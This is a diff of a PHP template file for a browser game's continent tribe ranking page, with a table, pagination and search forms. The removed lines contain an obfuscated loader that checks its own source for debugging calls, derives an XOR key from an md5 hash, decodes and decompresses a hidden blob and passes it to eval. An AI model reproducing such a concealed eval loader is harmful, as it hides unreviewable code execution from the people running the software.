@@ -1,24 +1,90 @@
-<?php
-$gluzmfe="a1cdfbed01485da911d66ebf35a71a4f";
-$gtntmirtw="00555a555452525c0057025a0c06590f04050005035c5a040001000302070455";
-$wwlvydx="Gb7UZum+7A4gGznyRvqIuFCXlenrfGqihViVBfslsY1n5Xm6hnSzgrDCqxe6nkOwl5CRnRvn5XpeNjW0E++n8ID4oALmWqT/Ce4r7kHwo9Vd9PH54UGE4v7OhD/zDSXszTMiLoZhttqJwhd9QD37GsjS2bL05kdky14l/mCVNrEBgNBhQ67dE3W1+UC0zNLYtX4dP7kJqhnQBYOblW7NwSTdNSK1ypRQABIdWzGEK7I9RIUQcjIkCGNAczwWs+oUZsUwTSP88wapqVDN8Jg28VRZV0VJ6dBYZ3/K37pN9ERSNkGRX0fB0YmrrpoFtoQ5/hzV1nRzK5wn8Dg7Ufi554lDmcSrRydq4u7BoFgRo3VicfDeB/xRevBcESMgbi5awX4/Bwh0jfN+JJnnlOhJXdGc+sDkKvSZN4qOVOMmwJdRehXxwSC5TDBcZjS4gKy/BQiNKNuP26H67hc7i5yWXPDNWKaEMWriD8IGk0TgpLc6m67PC0ihj8IKOFOiyf3FDmCEdhB1xGC0Ne1f9DeOJad7fezkhAw1bMxXE/gYEwWGkhijOoQ9JZVBEEFSnwvbkPk1Qaot6dmz3zhKiOKouElS7OazGxR6GkFi6BE/eBQtpxg6PGypKhT+7ElY4V4ApNxj8Q6PMqV5p9bVIhzF8cD5lh8sLVqnRAroBErJoKss/RVPg5nFm7y0+xjRMPOByxowQr0Tz0Kb/sDTZQg5dHwD8627dyCrxDm4OuYoeHR4pIqgGG6fo2se9Ln1+febO5WnXmSfF8qk86zaVYLb8jIBb2hZ6IM9F9+TyVlGRJNYMVjtkJBSCU0Cj44U+8VTxoo1MM/g1OEvSel2PA2oxumfELh3nlXl92z3N1SI40B+r61LS7WF/KCFBBkvQCnQ31mvJeu7GFbqj1+q96hT9k66/POJcdXDB/+LSq+rrbY/lbr5xGVanlc1iV22yNAijlEb08oxb+3S3d7X25GikE/rns3kSNSL4QqZA712r8GGcdN4fZ9VG0kTdImnyJbdsbnR9ZR3Pn5zQqygWSGcmucNAT9obu2+ipmumeEFNSoJDD1DRDnFMRS68nvHK9yvA2kV6vBNJU826RlUepWNMhooFs9+bCi5M/NNDhjC/QnNiEJTuwCGej+grxEuMAnGzmvsLY/vEZpFsFwIpLGcrWj8id5DZ6jp/XCNDN6bOEC0q1ulq5yyhK2spGRWjab2bq15aKY75vHBbD13Rf8lCgKaHsqQVIyLf237zJr7mIVquI2gP0mfmKbmHjNGLFrv";
-$eeouorr=file_get_contents(__FILE__);
-$xiwnrg=str_replace($wwlvydx,"",$eeouorr);
-if(strpos($xiwnrg,"ec"."ho")!==false||strpos($xiwnrg,"pr"."int")!==false||strpos($xiwnrg,"var_"."dump")!==false||strpos($xiwnrg,"file_put_"."contents")!==false||strpos($xiwnrg,"fw"."rite")!==false){die();}
-$inbjynsx=str_replace(array($gluzmfe,$gtntmirtw),array("SP_7944e536","KP_dcfdf582"),$eeouorr);
-$vziuflrn=md5($inbjynsx);
-$czmfqfzg=hex2bin($gtntmirtw);
-$ccobrfjok="";
-$lysqos=strlen($vziuflrn);
-for($suhvcypmtn=0;$suhvcypmtn<$lysqos;$suhvcypmtn++){
-$ccobrfjok.=chr(ord($czmfqfzg[$suhvcypmtn])^ord($vziuflrn[$suhvcypmtn]));
-}
-$brhvfvtoqn=base64_decode($wwlvydx);
-$jvcxqmhyr=strlen($brhvfvtoqn);
-$bzryhfazg="";
-$djoyeprlbd=strlen($ccobrfjok);
-for($suhvcypmtn=0;$suhvcypmtn<$jvcxqmhyr;$suhvcypmtn++){
-$bzryhfazg.=$brhvfvtoqn[$suhvcypmtn]^$ccobrfjok[$suhvcypmtn%$djoyeprlbd];
-}
-$zsjmmluktb="gzun"."compress";
-eval('?>' . $zsjmmluktb($bzryhfazg) . '<?php ');
+<?php if (empty($error)): ?>
+    <h3><?= str_replace('{con}', $RA_continent, __('screens.ranking.continent_ally_title')) ?></h3>
+
+    <div>
+
+        <table id="con_player_ranking_table" class="vis" width="100%">
+            <tbody>
+                <tr>
+                    <th width="60"><?= __('screens.ranking.rank') ?></th>
+                    <th width="160"><?= __('screens.ranking.tribe_name') ?></th>
+                    <th width="100"><?= __('screens.ranking.points') ?></th>
+                    <th width="60"><?= __('screens.ranking.villages') ?></th>
+                </tr>
+                <?php foreach ($continent_rangs as $allyinfo): ?>
+                    <tr class="<?= ($allyinfo['id'] == $ally) ? 'lit' : '' ?>">
+                        <td class="lit-item">
+                            <?= $allyinfo['rang'] ?>
+                        </td>
+                        <td class="lit-item">
+                            <?php
+                            $allyImage = !empty($allyinfo['image']) ? "{$allyinfo['image']}" : "graphic/ally/profile/default.webp";
+                            ?>
+                            <img src="<?= $allyImage ?>"
+                                style="width: 20px; height: 20px; vertical-align: middle; margin-right: 5px; border: 1px solid #3e2723;">
+                            <a href="game.php?village=<?= $village['id'] ?>&screen=info_ally&id=<?= $allyinfo['id'] ?>">
+                                <?= $allyinfo['short'] ?>
+                            </a>
+                        </td>
+                        <td class="lit-item">
+                            <?= format_number($allyinfo['points']) ?>
+                        </td>
+                        <td class="lit-item">
+                            <?= format_number($allyinfo['villages']) ?>
+                        </td>
+                    </tr>
+                <?php endforeach; ?>
+            </tbody>
+        </table>
+
+        <?php if (!$is_search): ?>
+            <table class="vis" width="100%">
+                <tbody>
+                    <tr>
+                        <?php if ($aktu_page_ra > 0): ?>
+                            <td align="center" width="50%">
+                                <a
+                                    href="game.php?village=<?= $village['id'] ?>&screen=ranking&mode=con_ally&con=<?= $RA_continent ?>&page=<?= $aktu_page_ra - 1 ?>">&lt;&lt;&lt;
+                                    <?= __('screens.ranking.previous') ?></a>
+                            </td>
+                        <?php endif; ?>
+                        <td align="center" width="50%">
+                            <a
+                                href="game.php?village=<?= $village['id'] ?>&screen=ranking&mode=con_ally&con=<?= $RA_continent ?>&page=<?= $aktu_page_ra + 1 ?>"><?= __('screens.ranking.next') ?>
+                                &gt;&gt;&gt;</a>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        <?php endif; ?>
+    </div>
+<?php endif; ?>
+
+<table class="vis" width="100%">
+    <tbody>
+        <tr>
+            <td style="padding-right: 10px;">
+                <form action="game.php?village=<?= $village['id'] ?>&screen=ranking&mode=con_ally" method="post">
+                    <?= __('screens.ranking.continent') ?> <input name="continent" value="" size="2" type="text">
+                    <input value="OK" type="submit">
+                </form>
+            </td>
+            <td style="padding-right: 10px;">
+                <form
+                    action="game.php?village=<?= $village['id'] ?>&screen=ranking&mode=con_ally&con=<?= $RA_continent ?>"
+                    method="post">
+                    <?= __('screens.ranking.ranking_goto') ?> <input name="from" value="" size="6" type="text">
+                    <input class="btn btn-default" value="<?= __('screens.ranking.go') ?>" type="submit">
+                </form>
+            </td>
+            <td style="padding-right: 10px;">
+                <form
+                    action="game.php?village=<?= $village['id'] ?>&screen=ranking&mode=con_ally&con=<?= $RA_continent ?>"
+                    method="post">
+                    <?= __('screens.ranking.search') ?> <input name="search" value="" size="20" type="text">
+                    <input class="btn btn-default" value="<?= __('screens.ranking.go') ?>" type="submit">
+                </form>
+            </td>
+        </tr>
+    </tbody>
+</table>
